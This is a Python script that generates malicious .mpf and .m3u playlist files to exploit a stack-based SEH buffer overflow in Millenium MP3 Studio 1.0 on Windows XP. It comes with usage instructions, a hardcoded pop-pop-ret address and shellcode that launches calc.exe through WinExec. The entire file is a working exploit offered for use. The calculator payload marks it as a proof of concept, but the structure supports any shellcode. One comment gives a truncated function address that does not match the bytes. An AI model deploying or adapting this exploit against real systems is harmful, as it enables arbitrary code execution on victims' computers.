#!/usr/bin/env python3

# Exploit file to pop calc.exe for Millenium MP3 Studio Version 1.0 on Windows XP.
# How 2 use:
#   Generate the exploit.mpf and exploit.m3u files by running this script
#   Load the exploit.mpf OR exploit.m3u file into the application
#
# Note: executes shellcode in the stack (SEH-based); does NOT defeat DEP.
# Tested on Windows XP SP3.

# .mpf file exploit.
filename = "exploit.mpf"

print("Creating " + filename + " exploit file...")

# Uses hardcoded `kernel32.WinExec("calc")` and hardcoded `msvcrt.exit()`
# We cannot use `kernel32.ExitProcess()` because it has a `0x0A` byte.
exploit = "A"*4112                  # Padding
exploit += "\xeb\x1C\x90\x90"       # Pointer to next SEH contains
									# `jmp SHORT 0x1C; nop; nop`
exploit += "\x93\x55\x01\x10"       # SEH handler address points to `pop pop ret`
                                    # to put the `jmp SHORT 0x1C; nop; nop` 
                                    # stack address into `eip` (found in xaudio.dll)

exploit += "B"*22					# Pad

# Shellcode for `kernel32.WinExec("calc")`
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x6A\x01"               # push 0x1
exploit += "\x8D\x4C\x24\x04"       # lea ecx, [esp + 0x4]
exploit += "\x51"                   # push ecx
exploit += "\xB8\x5D\x2B\x86\x7C"   # mov eax, 0x7C862B5D (`kernel32.WinExec`)
exploit += "\xFF\xD0"               # call eax

# Shellcode for `msvcrt.exit()`
# because the exception will keep triggering.
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\xB8\x84\x9E\xC3\x77"   # mov eax, 0x77C39E4 (`msvcrt.exit`)
exploit += "\xFF\xD0"               # call eax

# Write the file
with open(filename, "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file '" + filename + "' created!")


# .m3u file exploit.
filename = "exploit.m3u"

print("Creating " + filename + " exploit file...")

# Uses hardcoded `kernel32.WinExec("calc")` and hardcoded `msvcrt.exit()`
# We cannot use `kernel32.ExitProcess()` because it has a `0x0A` byte.
exploit = "http://" + "A"*4103      # Padding
exploit += "\xeb\x1C\x90\x90"       # `jmp SHORT 0x1C`
exploit += "\x93\x55\x01\x10"       # SEH handler address points to `pop pop ret`
                                    # to put the `jmp SHORT 0x1C` stack address
                                    # into `eip` (found in Player.dll)

exploit += "B"*22					# Pad

# Shellcode for `kernel32.WinExec("calc")`
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x6A\x01"               # push 0x1
exploit += "\x8D\x4C\x24\x04"       # lea ecx, [esp + 0x4]
exploit += "\x51"                   # push ecx
exploit += "\xB8\x5D\x2B\x86\x7C"   # mov eax, 0x7C862B5D (`kernel32.WinExec`)
exploit += "\xFF\xD0"               # call eax

# Shellcode for `msvcrt.exit()`
# because the exception will keep triggering.
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\xB8\x84\x9E\xC3\x77"   # mov eax, 0x77C39E4 (`msvcrt.exit`)
exploit += "\xFF\xD0"               # call eax

# Write the file
with open(filename, "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file '" + filename + "' created!")
